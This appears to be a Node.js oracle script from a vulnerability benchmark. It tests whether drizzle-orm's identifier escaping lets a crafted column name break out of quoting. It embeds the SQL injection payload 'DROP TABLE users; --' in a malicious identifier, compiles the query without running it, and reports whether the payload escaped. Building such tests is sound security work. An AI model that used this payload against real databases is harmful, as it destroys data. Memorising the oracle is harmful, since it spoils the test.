'use strict';
const os = require('node:os');

function main() {
  const result = { operation_completed: false, exploit_succeeded: false, evidence: '' };

  let core, pgCore;
  try {
    core = require('drizzle-orm');
    pgCore = require('drizzle-orm/pg-core');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  const { sql } = core;
  const { pgTable, text, integer, PgDialect } = pgCore;

  let dialect;
  try {
    dialect = new PgDialect();
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  let usersTable;
  try {
    usersTable = pgTable('users', {
      id: integer('id').primaryKey(),
      name: text('name'),
      secret: text('secret')
    });
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  // Benign operation: use a normal column name through the query builder
  // (dynamic column access via a safe, non-attacker-controlled key) to prove
  // the basic select + compile path works.
  let benignOk = false;
  try {
    const benignQuery = sql`SELECT ${usersTable.name} FROM ${usersTable} WHERE ${usersTable.id} = 1`;
    const built = dialect.sqlToQuery(benignQuery);
    if (built && typeof built.sql === 'string' && built.sql.includes('"name"') && built.sql.includes('"users"')) {
      benignOk = true;
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  result.operation_completed = true;

  // Malicious input: simulate a scenario where a table/column "name" string is
  // derived from user input and passed through drizzle's identifier escaping
  // via sql.identifier(). In the vulnerable version, an embedded double quote
  // in the identifier is NOT doubled (escaped) when building the final SQL
  // text, which lets the attacker break out of the quoted identifier and
  // inject raw SQL that an executing driver would run verbatim. We detect
  // this by compiling the query and checking whether the embedded quote was
  // doubled (safe) or left as a single quote (exploitable break-out).
  const injectedFragment = 'DROP TABLE users; --';
  const maliciousIdent = 'name" ; ' + injectedFragment + ' "';

  let exploitSucceeded = false;
  let evidence = '';
  try {
    const maliciousQuery = sql`SELECT ${sql.identifier(maliciousIdent)} FROM ${usersTable} WHERE ${usersTable.id} = 1`;
    const built = dialect.sqlToQuery(maliciousQuery);
    const compiled = (built && typeof built.sql === 'string') ? built.sql : '';

    // Locate the quoted identifier portion that starts right after "SELECT "
    // Find the first double-quote after SELECT and then scan forward to find
    // where the *properly escaped* identifier would end: a safe implementation
    // escapes every embedded `"` as `""`, so the identifier token in the SQL
    // would be: "name"" ; DROP TABLE users; -- """ (quote-doubled) — i.e. no
    // single unescaped quote appears before the terminating quote.
    // We detect exploitation by checking whether a bare (non-doubled) quote
    // appears immediately before the injected fragment text, which would mean
    // the identifier quoting was broken out of.
    const selectIdx = compiled.indexOf('SELECT');
    const afterSelect = selectIdx >= 0 ? compiled.slice(selectIdx) : compiled;

    // Pattern for an unsafe (vulnerable) compile: a single `"` directly
    // followed by the injected fragment (not doubled quote `""`).
    const unsafePattern = '"' + injectedFragment;
    // Pattern for a safe (escaped) compile: the quote before the fragment is
    // doubled -> '""' + fragment
    const safePattern = '""' + injectedFragment;

    if (afterSelect.includes(safePattern)) {
      exploitSucceeded = false;
      evidence = 'Malicious identifier was safely escaped (internal quote doubled); compiled SQL: ' + compiled.slice(0, 200);
    } else if (afterSelect.includes(unsafePattern)) {
      exploitSucceeded = true;
      evidence = 'Malicious identifier broke out of quoting (single unescaped quote before injected fragment); compiled SQL: ' + compiled.slice(0, 200);
    } else if (afterSelect.includes(injectedFragment)) {
      // Fragment present but pattern ambiguous - treat presence of raw
      // fragment without any quote doubling nearby as exploited.
      exploitSucceeded = !afterSelect.includes('""');
      evidence = (exploitSucceeded
        ? 'Injected fragment present in compiled SQL without quote doubling: '
        : 'Injected fragment present but quoting appears escaped: ') + compiled.slice(0, 200);
    } else {
      exploitSucceeded = false;
      evidence = 'Malicious identifier did not yield injected fragment in compiled SQL; compiled SQL: ' + compiled.slice(0, 200);
    }
  } catch (e) {
    exploitSucceeded = false;
    evidence = 'Malicious identifier was rejected/blocked (exception): ' + (e && e.message ? e.message : String(e));
  }

  result.exploit_succeeded = exploitSucceeded;
  result.evidence = evidence;

  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

main();
